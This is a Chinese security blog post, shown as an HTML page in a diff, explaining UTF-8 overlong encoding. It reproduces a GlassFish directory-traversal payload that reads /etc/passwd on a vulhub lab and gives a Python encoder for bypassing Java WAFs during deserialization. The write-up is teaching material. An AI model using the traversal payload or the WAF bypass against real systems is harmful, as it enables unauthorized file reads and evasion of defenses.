@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"sun-zzz.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":200,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="GlassFish 任意文件读取漏洞、利用Overlong Encoding绕过java的waf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="UTF-8 Overlong Encoding导致的安全问题">
+<meta property="og:url" content="https://sun-zzz.github.io/article/UTF-8-Overlong-Encoding%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98.html">
+<meta property="og:site_name" content="rev1ve&#39;s blog">
+<meta property="og:description" content="GlassFish 任意文件读取漏洞、利用Overlong Encoding绕过java的waf">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sun-zzz.github.io/article/UTF-8-Overlong-Encoding%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20240331111429771.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/UTF-8-Overlong-Encoding%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20240331112900764.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/UTF-8-Overlong-Encoding%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20240331113329452.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/UTF-8-Overlong-Encoding%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20240331113844349.png">
+<meta property="article:published_time" content="2024-03-31T02:54:44.000Z">
+<meta property="article:modified_time" content="2024-04-12T13:28:27.386Z">
+<meta property="article:author" content="rev1ve">
+<meta property="article:tag" content="java安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sun-zzz.github.io/article/UTF-8-Overlong-Encoding%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20240331111429771.png">
+
+<link rel="canonical" href="https://sun-zzz.github.io/article/UTF-8-Overlong-Encoding%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>UTF-8 Overlong Encoding导致的安全问题 | rev1ve's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">rev1ve's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links" rel="section"><i class="fas fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sun-zzz.github.io/article/UTF-8-Overlong-Encoding%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="rev1ve">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="rev1ve's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          UTF-8 Overlong Encoding导致的安全问题
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-03-31 10:54:44" itemprop="dateCreated datePublished" datetime="2024-03-31T10:54:44+08:00">2024-03-31</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-04-12 21:28:27" itemprop="dateModified" datetime="2024-04-12T21:28:27+08:00">2024-04-12</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/article/UTF-8-Overlong-Encoding%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98.html" class="post-meta-item leancloud_visitors" data-flag-title="UTF-8 Overlong Encoding导致的安全问题" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/article/UTF-8-Overlong-Encoding%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/article/UTF-8-Overlong-Encoding%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>GlassFish 任意文件读取漏洞、利用Overlong Encoding绕过java的waf</p>
+<span id="more"></span>
+
+<h1 id="UTF-8-Overlong-Encoding导致的安全问题"><a href="#UTF-8-Overlong-Encoding导致的安全问题" class="headerlink" title="UTF-8 Overlong Encoding导致的安全问题"></a>UTF-8 Overlong Encoding导致的安全问题</h1><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html">参考文章</a></p>
+<h2 id="UTF-8编码原理"><a href="#UTF-8编码原理" class="headerlink" title="UTF-8编码原理"></a>UTF-8编码原理</h2><blockquote>
+<p>UTF-8是现在最流行的编码方式，它可以将unicode码表里的所有字符，用某种计算方式转换成长度是1到4位字节的字符。</p>
+</blockquote>
+<p>参考这个表格，我们就可以很轻松地将不同区间的unicode码转换成UTF-8编码：</p>
+<table>
+<thead>
+<tr>
+<th align="center">First code point</th>
+<th align="center">Last code point</th>
+<th align="center">Byte 1</th>
+<th align="center">Byte 2</th>
+<th align="center">Byte 3</th>
+<th align="center">Byte 4</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">U+0000</td>
+<td align="center">U+007F</td>
+<td align="center">0xxxxxxx</td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">U+0080</td>
+<td align="center">U+07FF</td>
+<td align="center">110xxxxx</td>
+<td align="center">10xxxxxx</td>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">U+0800</td>
+<td align="center">U+FFFF</td>
+<td align="center">1110xxxx</td>
+<td align="center">10xxxxxx</td>
+<td align="center">10xxxxxx</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">U+10000</td>
+<td align="center">U+10FFFF</td>
+<td align="center">11110xxx</td>
+<td align="center">10xxxxxx</td>
+<td align="center">10xxxxxx</td>
+<td align="center">10xxxxxx</td>
+</tr>
+</tbody></table>
+<p>举个例子，欧元符号€的unicode编码是U+20AC，按照如下方法将其转换成UTF-8编码</p>
+<ol>
+<li><p>首先，因为<code>U+20AC</code>是位于<code>U+0800</code>和<code>U+FFFF</code>之间的，所以由上图可知其UTF-8编码长度为3</p>
+</li>
+<li><p><code>U+20AC</code>的二进制表示为<code>10 0000 1010 1100</code>，将其从右到左分成4，6，6三组(第一组长度不足4要补0)就变成<code>0010 000010 101100</code>。</p>
+</li>
+<li><p>按照图表中的编码方式，分别在三组添加前缀后结果为<code>11100010 10000010 10101100</code>，对应的就是<code>\xE2\x82\xAC</code></p>
+<p><img src="/article/UTF-8-Overlong-Encoding%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20240331111429771.png"></p>
+</li>
+<li><p>而<code>\xE2\x82\xAC</code>即为欧元符号<code>€</code>的UTF-8编码</p>
+</li>
+</ol>
+<h2 id="Overlong-Encoding造成什么问题"><a href="#Overlong-Encoding造成什么问题" class="headerlink" title="Overlong Encoding造成什么问题"></a>Overlong Encoding造成什么问题</h2><blockquote>
+<p>Overlong Encoding就是将1个字节的字符，按照UTF-8编码方式强行编码成2位以上UTF-8字符的方法。</p>
+</blockquote>
+<p>举个例子，点号<code>.</code>的Unicode编码和ascii编码一致，均为<code>0x2E</code>。按照上表它只能被编码成单字节的UTF-8字符，但是如果按照下面方式去转换：</p>
+<ol>
+<li><code>0x2E</code>的二进制为<code>10 1110</code>，在前面补5个0变成<code>00000101110</code></li>
+<li>将其分成5位、6位两组：<code>00000</code>，<code>101110</code></li>
+<li>按照在<code>U+0080</code>到<code>U+07FF</code>区间编码方式，分别给这两组增加前缀<code>110</code>，<code>10</code>，结果是<code>11000000</code>，<code>10101110</code>，对应的是<code>\xC0\xAE</code></li>
+</ol>
+<p><code>0xC0AE</code>并不是一个合法的UTF-8字符，但我们确实是按照UTF-8编码方式将其转换出来的，这就是UTF-8设计中的一个缺陷。按照UTF-8的规范来说，我们应该使用字符可以对应的最小字节数来表示这个字符。那么对于点号来说，就应该是0x2e。但UTF-8编码转换的过程中，并没有限制往前补0，导致转换出了非法的UTF-8字符。</p>
+<p><strong>这种攻击方式就叫“Overlong Encoding”。</strong></p>
+<p>很多语言都对此攻击方式做出限制，如python想将<code>0xC0AE</code>转换成点号，就会抛出异常</p>
+<p><img src="/article/UTF-8-Overlong-Encoding%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20240331112900764.png"></p>
+<p>而在java中很多地方却并没有对其进行防御，因此导致安全漏洞。</p>
+<h2 id="GlassFish-任意文件读取漏洞"><a href="#GlassFish-任意文件读取漏洞" class="headerlink" title="GlassFish 任意文件读取漏洞"></a>GlassFish 任意文件读取漏洞</h2><blockquote>
+<p>GlassFish在解码URL时，没有考虑UTF-8 Overlong Encoding攻击，导致将<code>%c0%ae</code>解析为ASCCII字符的<code>.</code>（点）。利用<code>%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/</code>来向上跳转，达到目录穿越、任意文件读取的效果。</p>
+</blockquote>
+<p>我们用<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master">vulhub</a>的靶场复现一下</p>
+<p>这个漏洞就是在URL中使用<code>%C0%AE</code>来代替点号<code>.</code>，绕过目录穿越的限制，导致任意文件读取</p>
+<p>payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>可以发现成功读取<code>/etc/passwd</code></p>
+<p><img src="/article/UTF-8-Overlong-Encoding%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20240331113329452.png"></p>
+<h2 id="利用Overlong-Encoding绕过WAF"><a href="#利用Overlong-Encoding绕过WAF" class="headerlink" title="利用Overlong Encoding绕过WAF"></a>利用Overlong Encoding绕过WAF</h2><p><strong>绕过原理</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Java在反序列化时使用ObjectInputStream类，这个类实现了DataInput接口，这个接口定义了读取字符串的方法readUTF。在解码中，Java实际实现的是一个魔改过的UTF-8编码，名为“Modified UTF-8”(只使用三个字节来表示)。并且其三字节以内的转换过程是和UTF-8相同的，所以仍然继承了“Overlong Encoding”缺陷。</span><br></pre></td></tr></table></figure>
+
+<p>将ASCII字符串转换成Overlong Encoding的UTF-8编码，python脚本如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def convert_int(i: int) -&gt; bytes:</span><br><span class="line">    b1 = ((i &gt;&gt; 6) &amp; 0b11111) | 0b11000000</span><br><span class="line">    b2 = (i &amp; 0b111111) | 0b10000000</span><br><span class="line">    return bytes([b1, b2])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def convert_str(s: str) -&gt; bytes:</span><br><span class="line">    bs = b&#x27;&#x27;</span><br><span class="line">    for ch in s.encode():</span><br><span class="line">        bs += convert_int(ch)</span><br><span class="line">	</span><br><span class="line">	return bs</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print(convert_str(&#x27;.&#x27;)) # b&#x27;\xc0\xae&#x27;</span><br><span class="line">    print(convert_str(&#x27;org.example.Evil&#x27;)) # b&#x27;\xc1\xaf\xc1\xb2\xc1\xa7\xc0\xae\xc1\xa5\xc1\xb8\xc1\xa1\xc1\xad\xc1\xb0\xc1\xac\xc1\xa5\xc0\xae\xc1\x85\xc1\xb6\xc1\xa9\xc1\xac&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下</p>
+<p><img src="/article/UTF-8-Overlong-Encoding%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20240331113844349.png"></p>
+<p>总结一下，在java环境下可以利用Overlong Encoding绕过waf的限制，使得我们可以执行恶意代码。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/java%E5%AE%89%E5%85%A8/" rel="tag"># java安全</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/article/Headless-HackTheBox.html" rel="prev" title="Headless">
+      <i class="fa fa-chevron-left"></i> Headless
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/article/NSSRound-20-Basic.html" rel="next" title="NSSRound#20 Basic">
+      NSSRound#20 Basic <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#UTF-8-Overlong-Encoding%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="nav-number">1.</span> <span class="nav-text">UTF-8 Overlong Encoding导致的安全问题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#UTF-8%E7%BC%96%E7%A0%81%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.</span> <span class="nav-text">UTF-8编码原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Overlong-Encoding%E9%80%A0%E6%88%90%E4%BB%80%E4%B9%88%E9%97%AE%E9%A2%98"><span class="nav-number">1.2.</span> <span class="nav-text">Overlong Encoding造成什么问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GlassFish-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.3.</span> <span class="nav-text">GlassFish 任意文件读取漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8Overlong-Encoding%E7%BB%95%E8%BF%87WAF"><span class="nav-number">1.4.</span> <span class="nav-text">利用Overlong Encoding绕过WAF</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rev1ve"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">rev1ve</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">73</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2024-03 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rev1ve</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'EbJd2uGnZROX6CGHpkKNkBAj-gzGzoHsz',
+      appKey     : 'KXq3KsjxZ28WDhwbOrLlm4Yw',
+      placeholder: "快来评论叭",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : 'https://ebjd2ugn.lc-cn-n1-shared.com'
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
